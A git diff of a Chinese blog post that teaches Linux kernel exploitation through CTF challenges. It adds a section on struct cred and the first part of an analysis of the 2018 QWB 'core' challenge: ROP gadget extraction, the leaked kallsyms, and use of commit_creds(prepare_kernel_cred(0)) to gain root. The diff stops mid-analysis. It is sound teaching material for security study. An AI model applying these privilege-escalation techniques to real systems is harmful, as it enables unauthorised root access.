@@ -69,7 +69,7 @@
 
 <meta itemprop="datePublished" content="2018-10-03T19:50:41&#43;08:00" />
 <meta itemprop="dateModified" content="2018-10-03T19:50:41&#43;08:00" />
-<meta itemprop="wordCount" content="5590">
+<meta itemprop="wordCount" content="11652">
 
 
 
@@ -314,8 +314,8 @@
             <a href="https://bash-c.github.io/categories/writeup/"> writeup </a>
             
           </div>
-        <span class="more-meta"> 5590 words </span>
-          <span class="more-meta"> 12 min read </span>
+        <span class="more-meta"> 11652 words </span>
+          <span class="more-meta"> 24 min read </span>
 
         
         
@@ -344,7 +344,7 @@
 <li><a href="#ring-model">Ring Model</a></li>
 <li><a href="#loadable-kernel-modules-lkms">Loadable Kernel Modules(LKMs)</a>
 <ul>
-<li><a href="#常用指令">常用指令</a></li>
+<li><a href="#相关指令">相关指令</a></li>
 </ul></li>
 <li><a href="#syscall">syscall</a></li>
 <li><a href="#ioctl">ioctl</a></li>
@@ -353,6 +353,7 @@
 <li><a href="#user-space-to-kernel-space">user space to kernel space</a></li>
 <li><a href="#kernel-space-to-user-space">kernel space to user space</a></li>
 </ul></li>
+<li><a href="#struct-cred">struct cred</a></li>
 <li><a href="#内核态函数">内核态函数</a></li>
 <li><a href="#mitigation">Mitigation</a></li>
 <li><a href="#ctf-kernel-pwn-相关">CTF kernel pwn 相关</a></li>
@@ -366,7 +367,13 @@
 <li><a href="#exploit">Exploit</a></li>
 <li><a href="#get-root-shell">get root shell</a></li>
 </ul></li>
-<li><a href="#kernel-rop-2018强网杯-core">kernel ROP - 2018强网杯 - core</a></li>
+<li><a href="#kernel-rop-2018强网杯-core">kernel ROP - 2018强网杯 - core</a>
+<ul>
+<li><a href="#分析-1">分析</a></li>
+<li><a href="#思路-1">思路</a></li>
+<li><a href="#exploit-1">Exploit</a></li>
+<li><a href="#get-root-shell-1">get root shell</a></li>
+</ul></li>
 </ul></li>
 <li><a href="#reference-and-thanks-to">Reference and Thanks to</a></li>
 </ul></li>
@@ -387,7 +394,7 @@
 
 <h3 id="kernel">Kernel</h3>
 
-<p>kernel 也是一个程序，用来管理软件发出的数据 I/O 要求，讲这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，是现代操作系统最基本的部分。</p>
+<p>kernel 也是一个程序，用来管理软件发出的数据 I/O 要求，讲这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel 是现代操作系统最基本的部分。</p>
 
 <p><img src="https://upload.wikimedia.org/wikipedia/commons/8/8f/Kernel_Layout.svg" alt="" /></p>
 
@@ -426,7 +433,7 @@
 
 <p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</p>
 
-<h4 id="常用指令">常用指令</h4>
+<h4 id="相关指令">相关指令</h4>
 
 <ul>
 <li><strong>insmod</strong>: 讲指定模块加载到内核中</li>
@@ -435,7 +442,7 @@
 </ul>
 
 <blockquote>
-<p>大多数　kernel vulnerability 也出在 LVM 中。</p>
+<p>大多数　kernel vulnerability 也出在 LKM 中。</p>
 </blockquote>
 
 <h3 id="syscall">syscall</h3>
@@ -445,7 +452,7 @@
 <blockquote>
 <p>在 <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> 和 <em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。</p>
 
-<p>同时推荐一个很好用的网站 <a href="https://syscalls.kernelgrok.com">Linux Syscall Reference</a>，可以查阅 32 位系统调用对应的寄存器含义以及源码。欢迎师傅们推荐 64 位类似功能的网站。</p>
+<p>同时推荐一个很好用的网站 <a href="https://syscalls.kernelgrok.com">Linux Syscall Reference</a>，可以查阅 32 位系统调用对应的寄存器含义以及源码。</p>
 </blockquote>
 
 <h3 id="ioctl">ioctl</h3>
@@ -499,7 +506,9 @@ DESCRIPTION
        used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.</pre></td></tr></table>
 </div>
 </div>
-<p>可以看出 ioctl 也是一个系统调用，用于与设备通信，<code>int ioctl(int fd, unsigned long request, ...)</code> 的第一个参数为打开设备 (open) 返回的 <a href="http://m4x.fun/post/play-with-file-descriptor-1/">文件描述符</a>，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p>
+<p>可以看出 ioctl 也是一个系统调用，用于与设备通信。</p>
+
+<p><code>int ioctl(int fd, unsigned long request, ...)</code> 的第一个参数为打开设备 (open) 返回的 <a href="http://m4x.fun/post/play-with-file-descriptor-1/">文件描述符</a>，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p>
 
 <blockquote>
 <p>使用 ioctl 进行通信的原因：</p>
@@ -597,20 +606,109 @@ DESCRIPTION
 <li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li>
 </ol>
 
+<h3 id="struct-cred">struct cred</h3>
+
+<p>之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p>
+
+<p><a href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred">源码</a> 如下:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">struct</span> <span class="no">cred</span> <span class="err">{</span>
+	<span class="nf">atomic_t</span>	<span class="no">usage</span><span class="c">;
+</span><span class="c">#ifdef CONFIG_DEBUG_CREDENTIALS
+</span><span class="c"></span>	<span class="no">atomic_t</span>	<span class="no">subscribers</span><span class="c">;	/* number of processes subscribed */
+</span><span class="c"></span>	<span class="no">void</span>		<span class="p">*</span><span class="no">put_addr</span><span class="c">;
+</span><span class="c"></span>	<span class="no">unsigned</span>	<span class="no">magic</span><span class="c">;
+</span><span class="c">#define CRED_MAGIC	0x43736564
+</span><span class="c">#define CRED_MAGIC_DEAD	0x44656144
+</span><span class="c">#endif
+</span><span class="c"></span>	<span class="no">kuid_t</span>		<span class="no">uid</span><span class="c">;		/* real UID of the task */
+</span><span class="c"></span>	<span class="no">kgid_t</span>		<span class="no">gid</span><span class="c">;		/* real GID of the task */
+</span><span class="c"></span>	<span class="no">kuid_t</span>		<span class="no">suid</span><span class="c">;		/* saved UID of the task */
+</span><span class="c"></span>	<span class="no">kgid_t</span>		<span class="no">sgid</span><span class="c">;		/* saved GID of the task */
+</span><span class="c"></span>	<span class="no">kuid_t</span>		<span class="no">euid</span><span class="c">;		/* effective UID of the task */
+</span><span class="c"></span>	<span class="no">kgid_t</span>		<span class="no">egid</span><span class="c">;		/* effective GID of the task */
+</span><span class="c"></span>	<span class="no">kuid_t</span>		<span class="no">fsuid</span><span class="c">;		/* UID for VFS ops */
+</span><span class="c"></span>	<span class="no">kgid_t</span>		<span class="no">fsgid</span><span class="c">;		/* GID for VFS ops */
+</span><span class="c"></span>	<span class="no">unsigned</span>	<span class="no">securebits</span><span class="c">;	/* SUID-less security management */
+</span><span class="c"></span>	<span class="no">kernel_cap_t</span>	<span class="no">cap_inheritable</span><span class="c">; /* caps our children can inherit */
+</span><span class="c"></span>	<span class="no">kernel_cap_t</span>	<span class="no">cap_permitted</span><span class="c">;	/* caps we&#39;re permitted */
+</span><span class="c"></span>	<span class="no">kernel_cap_t</span>	<span class="no">cap_effective</span><span class="c">;	/* caps we can actually use */
+</span><span class="c"></span>	<span class="no">kernel_cap_t</span>	<span class="no">cap_bset</span><span class="c">;	/* capability bounding set */
+</span><span class="c"></span>	<span class="no">kernel_cap_t</span>	<span class="no">cap_ambient</span><span class="c">;	/* Ambient capability set */
+</span><span class="c">#ifdef CONFIG_KEYS
+</span><span class="c"></span>	<span class="no">unsigned</span> <span class="no">char</span>	<span class="no">jit_keyring</span><span class="c">;	/* default keyring to attach requested
+</span><span class="c"></span>					 <span class="p">*</span> <span class="no">keys</span> <span class="no">to</span> <span class="p">*</span><span class="err">/</span>
+	<span class="nf">struct</span> <span class="no">key</span> <span class="no">__rcu</span> <span class="p">*</span><span class="no">session_keyring</span><span class="c">; /* keyring inherited over fork */
+</span><span class="c"></span>	<span class="no">struct</span> <span class="no">key</span>	<span class="p">*</span><span class="no">process_keyring</span><span class="c">; /* keyring private to this process */
+</span><span class="c"></span>	<span class="no">struct</span> <span class="no">key</span>	<span class="p">*</span><span class="no">thread_keyring</span><span class="c">; /* keyring private to this thread */
+</span><span class="c"></span>	<span class="no">struct</span> <span class="no">key</span>	<span class="p">*</span><span class="no">request_key_auth</span><span class="c">; /* assumed request_key authority */
+</span><span class="c">#endif
+</span><span class="c">#ifdef CONFIG_SECURITY
+</span><span class="c"></span>	<span class="no">void</span>		<span class="p">*</span><span class="no">security</span><span class="c">;	/* subjective LSM security */
+</span><span class="c">#endif
+</span><span class="c"></span>	<span class="no">struct</span> <span class="no">user_struct</span> <span class="p">*</span><span class="no">user</span><span class="c">;	/* real user ID subscription */
+</span><span class="c"></span>	<span class="no">struct</span> <span class="no">user_namespace</span> <span class="p">*</span><span class="no">user_ns</span><span class="c">; /* user_ns the caps and keyrings are relative to. */
+</span><span class="c"></span>	<span class="no">struct</span> <span class="no">group_info</span> <span class="p">*</span><span class="no">group_info</span><span class="c">;	/* supplementary groups for euid/fsgid */
+</span><span class="c"></span>	<span class="no">struct</span> <span class="no">rcu_head</span>	<span class="no">rcu</span><span class="c">;		/* RCU deletion hook */
+</span><span class="c"></span><span class="err">}</span> <span class="no">__randomize_layout</span><span class="err">;</span></code></pre></td></tr></table>
+</div>
+</div>
 <h3 id="内核态函数">内核态函数</h3>
 
 <p>相比用户态库函数，内核态的函数有了一些变化</p>
 
 <ul>
-<li>printf()      -&gt;      printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li>
-<li>memcpy()      -&gt;      copy_from_user()/copy_to_user()
+<li>printf()      -&gt;      <strong>printk()</strong>，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li>
+<li>memcpy()      -&gt;      <strong>copy_from_user()/copy_to_user()</strong>
 
 <ul>
 <li>copy_from_user() 实现了将用户空间的数据传送到内核空间</li>
 <li>copy_to_user() 实现了将内核空间的数据传送到用户空间</li>
 </ul></li>
-<li>malloc()      -&gt;      kmalloc()，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li>
-<li>free()        -&gt;      kfree()，同 kmalloc()</li>
+<li>malloc()      -&gt;      <strong>kmalloc()</strong>，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li>
+<li>free()        -&gt;      <strong>kfree()</strong>，同 kmalloc()</li>
 </ul>
 
 <p>另外要注意的是，<code>kernel 管理进程，因此 kernel 也记录了进程的权限</code>。kernel 中有两个可以方便的改变权限的函数：</p>
@@ -620,7 +718,7 @@ DESCRIPTION
 <li><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></li>
 </ul>
 
-<p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限（root 的 uid，gid 均为 0</p>
+<p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限（root 的 uid，gid 均为 0）</p>
 
 <p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看</p>
 <div class="highlight"><div class="chroma">
@@ -663,7 +761,7 @@ ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred</code></pre></td></tr></table>
 
 <h3 id="ctf-kernel-pwn-相关">CTF kernel pwn 相关</h3>
 
-<p>一般会给以下三种文件</p>
+<p>一般会给以下三个文件</p>
 
 <ol>
 <li>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</li>
@@ -1073,7 +1171,7 @@ CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> c
 
 <p>也就是说如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过得，这样就造成了一个 UAF。</p>
 
-<p>那么有了 UAF 要怎么用呢？之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p>
+<p>那么有了 UAF 要怎么用呢？根据之前的分析，可以修改进程的 cred 结构。</p>
 
 <p>其中 4.4.72 的 cred 结构体 <a href="/usr/src/linux-headers-4.15.0-29deepin/include/linux/compiler_types.h">定义</a> 如下：</p>
 <div class="highlight"><div class="chroma">
@@ -1172,7 +1270,7 @@ CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> c
 
 <h4 id="exploit">Exploit</h4>
 
-<p>注释都写在代码里了，[download]()</p>
+<p>注释都写在代码里了，<a href="https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/exploit.c">exploit here</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
@@ -1350,6 +1448,1398 @@ exploit
 
 <h3 id="kernel-rop-2018强网杯-core">kernel ROP - 2018强网杯 - core</h3>
 
+<h4 id="分析-1">分析</h4>
+
+<p>题目给了 <code>bzImage</code>，<code>core.cpio</code>，<code>start.sh</code> 以及带符号表的 <code>vmlinux</code> 四个文件</p>
+
+<p>前三个文件我们已经知道了作用，<code>vmlinux</code> 则是静态编译，未经过压缩的 kernel 文件，相对应的 <code>bzImage</code> 可以理解为压缩后的文件，更详细的可以看 <a href="https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml">stackexchange</a></p>
+
+<p>vmlinux 未经过压缩，也就是说我们可以从 vmlinux 中找到一些 gadget，我们先把 gadget 保存下来备用。</p>
+
+<blockquote>
+<p>建议使用 <a href="https://github.com/sashs/Ropper">Ropper</a> 来寻找 gadget，在我测试时，ropper 用了两分半钟提取出了所有的 gadget，而 <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> 用了半个小时耗尽了内存还没跑出结果。。。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">give_to_player <span class="o">[</span>master●<span class="o">]</span> <span class="nb">time</span> ropper --file ./vmlinux --nocolor &gt; g1
+<span class="o">[</span>INFO<span class="o">]</span> Load gadgets from cache
+<span class="o">[</span>LOAD<span class="o">]</span> loading... <span class="m">100</span>%
+<span class="o">[</span>LOAD<span class="o">]</span> removing double gadgets... <span class="m">100</span>%
+ropper --file ./vmlinux --nocolor &gt; g1  <span class="m">147</span>.42s user <span class="m">25</span>.68s system <span class="m">111</span>% cpu <span class="m">2</span>:35.17 total
+
+give_to_player <span class="o">[</span>master●<span class="o">]</span> <span class="nb">time</span> ROPgadget --binary ./vmlinux &gt; g2
+<span class="o">[</span><span class="m">2</span><span class="o">]</span>    <span class="m">16597</span> killed     ROPgadget --binary ./vmlinux &gt; g2
+ROPgadget --binary ./vmlinux &gt; g2  <span class="m">1064</span>.39s user <span class="m">42</span>.52s system <span class="m">54</span>% cpu <span class="m">33</span>:35.89 total</code></pre></td></tr></table>
+</div>
+</div>
+<p>如果题目没有给 vmlinux，可以通过 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 提取。</p>
+
+<p>看一下 start.sh</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">give_to_player <span class="o">[</span>master●●<span class="o">]</span> ls
+bzImage  core.cpio  start.sh  vmlinux
+give_to_player <span class="o">[</span>master●●<span class="o">]</span> bat start.sh 
+───────┬─────────────────────────────────────────────────────────────────────────────────
+       │ File: start.sh
+───────┼─────────────────────────────────────────────────────────────────────────────────
+   <span class="m">1</span>   │ qemu-system-x86_64 <span class="se">\
+</span><span class="se"></span>   <span class="m">2</span>   │ -m 64M <span class="se">\
+</span><span class="se"></span>   <span class="m">3</span>   │ -kernel ./bzImage <span class="se">\
+</span><span class="se"></span>   <span class="m">4</span>   │ -initrd  ./core.cpio <span class="se">\
+</span><span class="se"></span>   <span class="m">5</span>   │ -append <span class="s2">&#34;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&#34;</span> <span class="se">\
+</span><span class="se"></span>   <span class="m">6</span>   │ -s  <span class="se">\
+</span><span class="se"></span>   <span class="m">7</span>   │ -netdev user,id<span class="o">=</span>t0, -device e1000,netdev<span class="o">=</span>t0,id<span class="o">=</span>nic0 <span class="se">\
+</span><span class="se"></span>   <span class="m">8</span>   │ -nographic  <span class="se">\
+</span><span class="se"></span>───────┴─────────────────────────────────────────────────────────────────────────────────</code></pre></td></tr></table>
+</div>
+</div>
+<p>发现内核开启了 kaslr 保护。</p>
+
+<p>解压 <code>core.cpio</code> 后，看一下 init</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">give_to_player <span class="o">[</span>master●<span class="o">]</span> file core.cpio 
+core.cpio: gzip compressed data, last modified: Fri Mar <span class="m">23</span> <span class="m">13</span>:41:13 <span class="m">2018</span>, max compression, from Unix, original size <span class="m">53442048</span>
+give_to_player <span class="o">[</span>master●<span class="o">]</span> mkdir core
+give_to_player <span class="o">[</span>master●<span class="o">]</span> <span class="nb">cd</span> core 
+core <span class="o">[</span>master<span class="o">]</span> mv ../core.cpio core.cpio.gz
+core <span class="o">[</span>master●<span class="o">]</span> gunzip ./core.cpio.gz 
+core <span class="o">[</span>master●<span class="o">]</span> cpio -idm &lt; ./core.cpio
+<span class="m">104379</span> 块
+core <span class="o">[</span>master●<span class="o">]</span> bat init 
+───────┬─────────────────────────────────────────────────────────────────────────────────
+       │ File: init
+───────┼─────────────────────────────────────────────────────────────────────────────────
+   <span class="m">1</span>   │ <span class="cp">#!/bin/sh
+</span><span class="cp"></span>   <span class="m">2</span>   │ mount -t proc proc /proc
+   <span class="m">3</span>   │ mount -t sysfs sysfs /sys
+   <span class="m">4</span>   │ mount -t devtmpfs none /dev
+   <span class="m">5</span>   │ /sbin/mdev -s
+   <span class="m">6</span>   │ mkdir -p /dev/pts
+   <span class="m">7</span>   │ mount -vt devpts -o <span class="nv">gid</span><span class="o">=</span><span class="m">4</span>,mode<span class="o">=</span><span class="m">620</span> none /dev/pts
+   <span class="m">8</span>   │ chmod <span class="m">666</span> /dev/ptmx
+   <span class="m">9</span>   │ cat /proc/kallsyms &gt; /tmp/kallsyms
+  <span class="m">10</span>   │ <span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/kptr_restrict
+  <span class="m">11</span>   │ <span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/dmesg_restrict
+  <span class="m">12</span>   │ ifconfig eth0 up
+  <span class="m">13</span>   │ udhcpc -i eth0
+  <span class="m">14</span>   │ ifconfig eth0 <span class="m">10</span>.0.2.15 netmask <span class="m">255</span>.255.255.0
+  <span class="m">15</span>   │ route add default gw <span class="m">10</span>.0.2.2 
+  <span class="m">16</span>   │ insmod /core.ko
+  <span class="m">17</span>   │ 
+  <span class="m">18</span>   │ poweroff -d <span class="m">120</span> -f <span class="p">&amp;</span>
+  <span class="m">19</span>   │ setsid /bin/cttyhack setuidgid <span class="m">1000</span> /bin/sh
+  <span class="m">20</span>   │ <span class="nb">echo</span> <span class="s1">&#39;sh end!\n&#39;</span>
+  <span class="m">21</span>   │ umount /proc
+  <span class="m">22</span>   │ umount /sys
+  <span class="m">23</span>   │ 
+  <span class="m">24</span>   │ poweroff -d <span class="m">0</span>  -f
+───────┴────────────────────────────</code></pre></td></tr></table>
+</div>
+</div>
+<p>发现了几处有意思的地方：</p>
+
+<ul>
+<li>第 9 行中把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中，那么我们就能从 <code>/tmp/kallsyms</code> 中读取 <code>commit_creds</code>，<code>prepare_kernel_cred</code> 的函数的地址了</li>
+<li>第 10 行把 <code>kptr_restrict</code> 设为 1，这样就不能通过 <code>/proc/kallsyms</code> 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了</li>
+<li>第 11 行把 <code>dmesg_restrict</code> 设为 1，这样就不能通过 <code>dmesg</code> 查看 kernel 的信息了</li>
+<li>第 18 行设置了定时关机，为了避免做题时产生干扰，直接把这句删掉然后重新打包</li>
+</ul>
+
+<p>同时还发现了一个 shell 脚本 <code>gen_cpio.sh</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">core <span class="o">[</span>master●<span class="o">]</span> bat gen_cpio.sh 
+───────┬─────────────────────────────────────────────────────────────────────────────────
+       │ File: gen_cpio.sh
+───────┼─────────────────────────────────────────────────────────────────────────────────
+   <span class="m">1</span>   │ find . -print0 <span class="se">\
+</span><span class="se"></span>   <span class="m">2</span>   │ <span class="p">|</span> cpio --null -ov --format<span class="o">=</span>newc <span class="se">\
+</span><span class="se"></span>   <span class="m">3</span>   │ <span class="p">|</span> gzip -9 &gt; <span class="nv">$1</span>
+───────┴─────────────────────────────────────────────────────────────────────────────────</code></pre></td></tr></table>
+</div>
+</div>
+<p>从名称和内容都可以看出这是一个方便打包的脚本，我们修改好 init 后重新打包，尝试运行 kernel</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">core <span class="o">[</span>master●●<span class="o">]</span> vim init 
+core <span class="o">[</span>master●●<span class="o">]</span> rm core.cpio 
+core <span class="o">[</span>master●●<span class="o">]</span> ./gen_cpio.sh core.cpio
+.
+./usr
+./usr/sbin
+./usr/sbin/popmaildir
+......
+......
+./core.cpio
+./core.ko
+<span class="m">129851</span> 块
+core <span class="o">[</span>master●●<span class="o">]</span> ls
+bin        core.ko  gen_cpio.sh  lib    linuxrc  root  sys  usr
+core.cpio  etc      init         lib64  proc     sbin  tmp  vmlinux
+core <span class="o">[</span>master●●<span class="o">]</span> mv core.cpio ..
+core <span class="o">[</span>master●●<span class="o">]</span> <span class="nb">cd</span> ..
+give_to_player <span class="o">[</span>master●●<span class="o">]</span> ./start.sh </code></pre></td></tr></table>
+</div>
+</div>
+<p>但这时候又遇到了新问题，内核运行不起来，从一闪即逝的报错信息中能看到是因为分配的内存过小，<code>start.sh</code> 中 <code>-m</code> 分配的是 64M，修改为 128M，终于能运行起来了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">/ $ lsmod
+core <span class="m">16384</span> <span class="m">0</span> - Live 0x0000000000000000 <span class="o">(</span>O<span class="o">)</span>
+......
+......
+give_to_player <span class="o">[</span>master●●<span class="o">]</span> cp core/core.ko .
+give_to_player <span class="o">[</span>master●●<span class="o">]</span> check ./core.ko
+./core.ko: ELF <span class="m">64</span>-bit LSB relocatable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, BuildID<span class="o">[</span>sha1<span class="o">]=</span>549436683d
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x0<span class="o">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>可以看出开启了 canary 保护，用 IDA 打开进一步分析。</p>
+
+<p><strong>init_module()</strong> 注册了 <code>/proc/core</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kr">__int64</span> <span class="nf">init_module</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">core_proc</span> <span class="o">=</span> <span class="n">proc_create</span><span class="p">(</span><span class="s">&#34;core&#34;</span><span class="p">,</span> <span class="mi">438LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">core_fops</span><span class="p">);</span>
+  <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x016c</span><span class="s">ore: created /proc/core entry</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>exit_core()</strong> 删除 <code>/proc/core</code></p>
+<div class="highlight"><div class="chroma">
